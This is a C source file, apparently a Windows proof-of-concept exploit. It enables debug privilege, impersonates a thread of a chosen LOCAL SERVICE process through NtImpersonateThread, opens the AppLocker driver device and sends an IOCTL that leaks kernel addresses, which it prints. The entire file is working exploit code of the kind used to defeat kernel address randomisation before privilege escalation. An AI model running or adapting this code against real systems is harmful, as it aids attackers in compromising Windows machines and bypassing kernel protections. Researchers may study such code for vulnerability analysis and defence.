#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <winternl.h>

#pragma comment(lib, "ntdllp.lib")

typedef struct KERNEL_LEAK {
    DWORD64 Value0;
    DWORD64 Value1;
    DWORD64 Value2;
    DWORD64 Value3;
    DWORD64 Value4;
    DWORD64 Value5;
    DWORD64 Value6;
} _KERNEL_LEAK, * PKERNEL_LEAK;

typedef NTSTATUS(WINAPI* pNtImpersonateThread)(HANDLE ThreadHandle, HANDLE ThreadToImpersonate, SECURITY_QUALITY_OF_SERVICE* SecurityQualityOfService);

DWORD GetProcessThreadID(DWORD PID)
{
    THREADENTRY32 te32 = { 0 };
    HANDLE hThreadSnap;

    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    te32.dwSize = sizeof(THREADENTRY32);
    Thread32First(hThreadSnap, &te32);

    do
    {
        if (te32.th32OwnerProcessID == PID)
        {
            printf("[+] First Thread ID of the process: %d\n", te32.th32ThreadID);
            return te32.th32ThreadID;
        }
    } while (Thread32Next(hThreadSnap, &te32));

    return ERROR_FILE_NOT_FOUND;
}

/*
 * Source: https://stackoverflow.com/a/40390858/1069307
 */
BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}

BOOL EnableDebugPrivilege()
{
    HANDLE tempTokenHandle;
    HANDLE currentToken;
    BOOL success = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &tempTokenHandle);
    if (!success)
    {
        printf("[-] Failed to open current process token\n");
        return FALSE;
    }

    currentToken = tempTokenHandle;
    success = SetPrivilege(currentToken, L"SeDebugPrivilege", TRUE);

    if (!success)
    {
        printf("[-] Failed to set SeDebugPrivilege\n");
        return FALSE;
    }

    return TRUE;
}

int wmain(int argc, wchar_t* argv[])
{

   if (argc >= 2 && (wcscmp(argv[1], L"-h") == 0 || wcscmp(argv[1], L"--help") == 0)) {
        wprintf(L"[+] Usage: %ls -p/--pid <LOCAL SERVICE PROCESS PID>\n", argv[0]);
        return 0;
    }

    DWORD threadId;
    if (argc >= 3 && (wcscmp(argv[1], L"-p") == 0 || wcscmp(argv[1], L"--pid") == 0)) {
        DWORD pid = (DWORD)wcstoul(argv[2], NULL, 10);
        wprintf(L"[+] Trying to find Thread ID for the given process PID: %lu\n", pid);
        threadId = GetProcessThreadID(pid);
    }

    BOOL success = EnableDebugPrivilege();
    if (!success)
    {
        printf("[-] EnableDebugPrivilege failed\n");
        return 1;
    }

    HANDLE hThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, threadId);

    if (hThread == NULL) {
        printf("[-] OpenThread failed with error %d\n", GetLastError());
        return 1;
    }
    else {
        printf("[+] Opened a THREAD_DIRECT_IMPERSONATION handle to the LOCAL_SERVICE process\n");
    }

    pNtImpersonateThread NtImpersonateThread = (pNtImpersonateThread)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtImpersonateThread");

    if (!NtImpersonateThread) {
        printf("[-] Unable to find ntdll!NtImpersonateThread\n");
        return FALSE;
    }

    SECURITY_QUALITY_OF_SERVICE secquality = { 0 };

    secquality.Length = sizeof(secquality);
    secquality.ImpersonationLevel = SecurityImpersonation;
    NTSTATUS status = NtImpersonateThread(GetCurrentThread(), hThread, &secquality);

    if (!NT_SUCCESS(status))
    {
        printf("[-] NtImpersonateThread failed with status : %x\n", status);
        return 1;
    }

    printf("[+] Opening handle to Applocker device\n");

    HANDLE hDriver = CreateFileW(
        L"\\\\.\\AppID",
        GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL);

    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to open handle: %d", GetLastError());
        return 1;
    }

    DWORD size = 48;

    KERNEL_LEAK kernel_leak = {};

    printf("[+] Calling AipDeviceIoControlDispatch ....");

    NTSTATUS device_status = DeviceIoControl(
        hDriver,
        0x22A014,
        0,
        0,
        &kernel_leak,
        size,
        nullptr,
        nullptr);

   if (device_status) {
        printf("success\n");
    }
    else {
        printf("failed\n");
        return 1;
    }

    printf("[+] Leaked Kernel Address:\n");
    printf("\t[*] Value0: 0x%016llX\n", kernel_leak.Value0);
    printf("\t[*] Value1: 0x%016llX\n", kernel_leak.Value1);
    printf("\t[*] Value2: 0x%016llX\n", kernel_leak.Value2);
    printf("\t[*] Value3: 0x%016llX\n", kernel_leak.Value3);
    printf("\t[*] Value4: 0x%016llX\n", kernel_leak.Value4);
    printf("\t[*] Value5: 0x%016llX\n", kernel_leak.Value5);

    return 0;

}